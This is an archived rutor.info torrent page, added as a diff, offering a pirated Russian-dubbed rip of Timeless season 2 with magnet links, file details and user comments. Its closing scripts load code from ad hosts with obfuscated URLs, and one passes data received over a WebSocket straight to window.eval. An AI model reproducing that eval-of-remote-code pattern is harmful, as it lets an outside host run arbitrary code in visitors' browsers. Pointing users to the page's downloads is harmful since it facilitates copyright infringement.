@@ -1,0 +1,439 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip 720p | OmskBird</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip 720p | OmskBird</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:f4c2190500e8b9eb345d2a320cadfe608ccbf8f5&amp;dn=rutor.info_%D0%92%D0%BD%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D0%B5%D0%BD%D0%B8+%2F+Timeless+%5B02%D1%8501-08+%D0%B8%D0%B7+16%5D+%282018%29+WEBRip+720p+%7C+OmskBird&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=618885"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/618885"><img src="http://s.rutor.info/t/down.png"> Скачать Timeless.S02.720p.WEBRip.OmskBird.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i100.fastpic.ru/big/2018/0312/06/05c473f7c9645903e4cd469e3e01ce06.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Вне времени<br />
+<b>Оригинальное название: </b>Timeless <br />
+<b>Год выхода: </b>2018<br />
+<b>Жанр: </b> <a href="/tag/4/фантастика" target="_blank">фантастика</a>, <a href="/tag/4/боевик" target="_blank">боевик</a>, <a href="/tag/4/драма" target="_blank">драма</a>, <a href="/tag/4/приключения" target="_blank">приключения</a><br />
+<b>Режиссер: </b>Нил Маршалл, Чарльз Бисон, Билл Джирхарт<br />
+<b>В ролях: </b>Эбигейл Спенсер, Мэтт Лантер, Малкольм Баррет, Пэтерсон Джозеф, Сакина Джаффри, Клаудия Дурмит, Горан Вишнич, Шантель Ван Сантен, Дэвид Сатклифф, Бэйли Ноубл, Мэтт Фрюэр, Сюзанна Томпсон, Хиро Канагава, Чад Рук, Майкл Кребс, Леа Кейрнс, Тревор Лернер и др.<br />
+<br />
+<b>О фильме:</b><br />
+Сюжет повествует о команде из трёх человек, путешествующих по времени в поисках могущественного гада, который вознамерился переписать историю человечества. Если трио не успеет сработаться и сорвать преступный план, миру, естественно, грозит катастрофа.<br />
+ <a href="http://www.imdb.com/title/tt5511582/" target="_blank"><img src="http://s.rutor.info/imdb/pic/5511582.gif" /></a> <a href="http://www.kinopoisk.ru/film/968215/" target="_blank"><img src="http://www.kinopoisk.ru/rating/968215.gif" /></a><br />
+<br />
+<b>Страна: </b>США, Davis Entertainment, Kripke Enterprises, MiddKid Productions, Sony Pictures Television<br />
+<b>Продолжительность: </b>~ 00:44:00 серия<br />
+<b>Перевод:</b> Любительский (многоголосый закадровый) OmskBird<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>MPEG-4 AVC/x.264<br />
+<b>Качество: </b>WEBRip 720p<br />
+<b>Видео: </b>1280x720 (16:9), 23.976 fps, ~2900 kbps, 0.130 bit/pixel<br />
+<b>Звук: </b><br />
+<b>Аудио rus:</b> AC3, 48 kHz, 2 ch, 192 Kbps | OmskBird<br />
+<b>Субтитры: </b>отсутствуют<br />
+<span style="color:#008000;"><b>Реклама:</b> присутствует</span><br />
+<br />
+<b><a href="http://sendfile.su/1405459" target="_blank">Семпл</a></b><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea"><br />
+General<br />
+Unique ID                                : 234720514845971039543660410484237336877 (0xB09586DD0B9C59CDA0D6F37B0965012D)<br />
+Complete name                            : G:FilmsTimeless.S02.720p.WEBRip.OmskBirdTimeless.S02E01.720p.WEBRip.OmskBird.mkv<br />
+Format                                   : Matroska<br />
+Format version                           : Version 4 / Version 2<br />
+File size                                : 971 MiB<br />
+Duration                                 : 43mn 23s<br />
+Overall bit rate                         : 3 128 Kbps<br />
+Encoded date                             : UTC 2018-03-12 18:18:35<br />
+Writing application                      : mkvmerge v18.0.0 (&#039;Apricity&#039;) 64-bit<br />
+Writing library                          : libebml v1.3.5 + libmatroska v1.4.8<br />
+Cover                                    : Yes<br />
+Attachments                              : small_cover.jpg / small_cover_land.jpg / cover.jpg / cover_land.jpg<br />
+<br />
+Video<br />
+ID                                       : 1<br />
+Format                                   : AVC<br />
+Format/Info                              : Advanced Video Codec<br />
+Format profile                           : Main@L3.2<br />
+Format settings, CABAC                   : Yes<br />
+Format settings, ReFrames                : 3 frames<br />
+Codec ID                                 : V_MPEG4/ISO/AVC<br />
+Duration                                 : 43mn 23s<br />
+Bit rate                                 : 2 873 Kbps<br />
+Width                                    : 1 280 pixels<br />
+Height                                   : 720 pixels<br />
+Display aspect ratio                     : 16:9<br />
+Frame rate mode                          : Constant<br />
+Frame rate                               : 23.976 (24000/1001) fps<br />
+Standard                                 : PAL<br />
+Color space                              : YUV<br />
+Chroma subsampling                       : 4:2:0<br />
+Bit depth                                : 8 bits<br />
+Scan type                                : Progressive<br />
+Bits/(Pixel*Frame)                       : 0.130<br />
+Stream size                              : 892 MiB (92%)<br />
+Language                                 : English<br />
+Default                                  : Yes<br />
+Forced                                   : No<br />
+Color range                              : Limited<br />
+Color primaries                          : BT.709<br />
+Transfer characteristics                 : BT.709<br />
+Matrix coefficients                      : BT.709<br />
+<br />
+Audio<br />
+ID                                       : 2<br />
+Format                                   : AC-3<br />
+Format/Info                              : Audio Coding 3<br />
+Mode extension                           : CM (complete main)<br />
+Format settings, Endianness              : Big<br />
+Codec ID                                 : A_AC3<br />
+Duration                                 : 43mn 23s<br />
+Bit rate mode                            : Constant<br />
+Bit rate                                 : 192 Kbps<br />
+Channel(s)                               : 2 channels<br />
+Channel positions                        : Front: L R<br />
+Sampling rate                            : 48.0 KHz<br />
+Frame rate                               : 31.250 fps (1536 spf)<br />
+Compression mode                         : Lossy<br />
+Stream size                              : 59.6 MiB (6%)<br />
+Title                                    : OmskBird<br />
+Language                                 : Russian<br />
+Default                                  : Yes<br />
+Forced                                   : No<br />
+<br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<a href="https://a.radikal.ru/a10/1803/a4/f2799732db13.jpg" target="_blank"><img src="https://d.radikal.ru/d04/1803/a9/004f81a83d3b.jpg" /></a>  <a href="https://c.radikal.ru/c41/1803/21/bc658f1aeca9.jpg" target="_blank"><img src="https://c.radikal.ru/c16/1803/d5/7beb30d29d16.jpg" /></a>  <a href="https://d.radikal.ru/d10/1803/de/75dc6d0cb1da.jpg" target="_blank"><img src="https://a.radikal.ru/a38/1803/5a/41862b4250c0.jpg" /></a>  <a href="https://b.radikal.ru/b37/1803/91/f53fe4b1dd2f.jpg" target="_blank"><img src="https://d.radikal.ru/d21/1803/cf/08084eef1cdb.jpg" /></a><br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Внимание! Раздача ведётся путём добавления новых серий.</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<b>Внимание! Раздача ведётся путём добавления новых серий; при каждом добавлении создётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:</b><br />
+Остановить скачивание.<br />
+Удалить старый торрент у себя из клиента (старые серии удалять не надо).<br />
+Скачать новый торрент и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку куда и должно происходить скачивание новых серий.<br />
+Ваш клиент при этом должен произвести хеширование (проверку) старой папки (если не производит сам - помогите ему сделать это), и будет докачивать только те серии которых у вас ещё нет. Старые серии при этом не удаляются, а продолжают раздаваться!<br />
+Eсли вы уже удалили старые серии, то предотвратить повторную закачку старых серий можно, отжав галочку в соответсвующих местах при запуске нового торрента. По возможности, желательно не удалять старые серии как можно дольше чтобы релизёр не столько продолжал раздавать старые серии, а смог сконцентрироваться на новых.<br />
+</textarea></div><br />
+<b>Релиз от: </b>OmskBird</td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1238815/0" target="_blank">skyn s61</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>7.7 из 10 (3 голосов, самая низкая оценка - 6, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/seriali" target="_blank">Сериалы </a></td></tr>
+<tr><td class="header">Раздают</td><td>1</td></tr>
+<tr><td class="header">Качают</td><td>8</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 4:19:06 (40 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 16:53:22  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>7.68&nbsp;GB  (8246355433 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 618885);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/622305"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:246f26b8e6c72a96c74870f527d80c121f3c3d4d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/622305/vne-vremeni_timeless-02h01-08-iz-16-2018-webrip-1080p-profix-media">Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip 1080p | Profix Media </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">15.39&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;9</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/622304"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5c26204f6504dce3572b5b6c228af64b0533b9dd&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/622304/vne-vremeni_timeless-02h01-08-iz-16-2018-webrip-720p-profix-media">Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip 720p | Profix Media </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.79&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;11</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/622303"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9e65ac94b1231ed6ba95d36700363911bf7c3c83&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/622303/vne-vremeni_timeless-02h01-08-iz-16-2018-webrip-profix-media">Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip | Profix Media </a></td> 
+<td align="right">10.01&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/618890"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0e23e19bb6db042cfc86b11e6d0972c9f0ec1be5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/618890/vne-vremeni_timeless-02h01-08-iz-16-2018-webrip-omskbird">Вне времени / Timeless [02х01-08 из 16] (2018) WEBRip | OmskBird </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">4.88&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="gai"><td>07&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630277"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cc78ef61d8b9d1728ce8b719766e40391a0a11a0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630277/vne-vremeni_timeless-02x01-08-iz-16-2018-webrip-coldfilm">Вне времени / Timeless [02x01-08 из 16] (2018) WEBRip | ColdFilm </a></td> 
+<td align="right">3.70&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;34</span></td></tr><tr class="tum"><td>07&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630278"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:264177407c1364f24b7f634adf5f1a205c126049&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630278/vne-vremeni_timeless-02x01-08-iz-16-2018-webrip-720p-coldfilm">Вне времени / Timeless [02x01-08 из 16] (2018) WEBRip 720p | ColdFilm </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">8.67&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;18</span></td></tr><tr class="gai"><td>04&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/621458"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bbe11856e6eff150df074be8484de242495b401f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/621458/vne-vremeni_timeless-02x01-07-iz-16-2018-web-dlrip-jaskier">Вне времени / Timeless [02x01-07 из 16] (2018) WEB-DLRip | Jaskier </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.41&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;11</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/4/0/0/Timeless" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/618885.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (8)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=618885">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(618885);">Промодерировать раздачу</span> | <span onclick="confirm_delete(618885);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/618885">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>skyn s61</b></td> <td>08-05-2018 16:34:24 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199434"></span><script type="text/javascript">cOptions(1238815,3199434);</script></td></tr><tr><td class="c_t" colspan=4><b>8-я серия</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>qans</b></td> <td>20-03-2018 22:07:14 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3175277"></span><script type="text/javascript">cOptions(1455674,3175277);</script></td></tr><tr><td class="c_t" colspan=4>Будем ждать в LostFilm в божеском размере</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>qans</b></td> <td>19-03-2018 10:20:09 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3174422"></span><script type="text/javascript">cOptions(1455674,3174422);</script></td></tr><tr><td class="c_t" colspan=4>Arcantoss<br />
+Неплохой сериал не гони пургу, поэтому и не закрыли, иди эша против зловещих смотри похожк твой репертуар</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>apollion2</b></td> <td>13-03-2018 0:51:54 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3170323"></span><script type="text/javascript">cOptions(1277474,3170323);</script></td></tr><tr><td class="c_t" colspan=4>Сериал был закрыт, потом открыт заново. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Petro2016</b></td> <td>13-03-2018 0:36:39 (2 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3170316"></span><script type="text/javascript">cOptions(1456933,3170316);</script></td></tr><tr><td class="c_t" colspan=4>Озвучка просто шедевральная. Первая серия второго сезона зашла на ура!!! OmskBird, спасибо за оперативность!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Diald</b></td> <td>12-03-2018 22:26:07 (2 месяца назад)</td> <td>Оценил на: <b>7</b></td> <td align="right"><span id="c_3170238"></span><script type="text/javascript">cOptions(1456107,3170238);</script></td></tr><tr><td class="c_t" colspan=4><b>Arcantoss</b> так его вроде и закрыли, была такая инфа</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Arcantoss</b></td> <td>12-03-2018 21:51:25 (2 месяца назад)</td> <td>Оценил на: <b>6</b></td> <td align="right"><span id="c_3170203"></span><script type="text/javascript">cOptions(479410,3170203);</script></td></tr><tr><td class="c_t" colspan=4>оу, был уверен, что это уг после первого сезона закроют</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
